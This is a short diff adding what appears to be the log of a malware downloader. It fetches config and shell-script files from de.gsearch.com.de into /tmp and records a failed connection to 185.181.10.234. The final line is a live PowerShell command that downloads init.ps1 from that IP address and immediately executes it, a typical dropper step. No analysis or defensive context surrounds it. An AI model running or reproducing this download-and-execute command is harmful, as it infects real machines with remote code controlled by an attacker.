@@ -1,0 +1,11 @@
+https://de.gsearch.com.de/api/config.json,/tmp/config.json
+no need download
+not need download
+i am here
+https://de.gsearch.com.de/api/update.sh,/tmp/update.sh
+no need download
+not tmp runing
+not tmps runing
+not tmps runing
+[+]download  error  Get http://de.gsearch.com.de/api/ips_cn.txt: read tcp 172.18.48.225:42760->185.181.10.234:80: read: connection reset by peer
+open : no such file or directoryiex(New-Object Net.WebClient).DownloadString('http://185.181.10.234/E5DB0E07C3D7BE80V520/init.ps1')
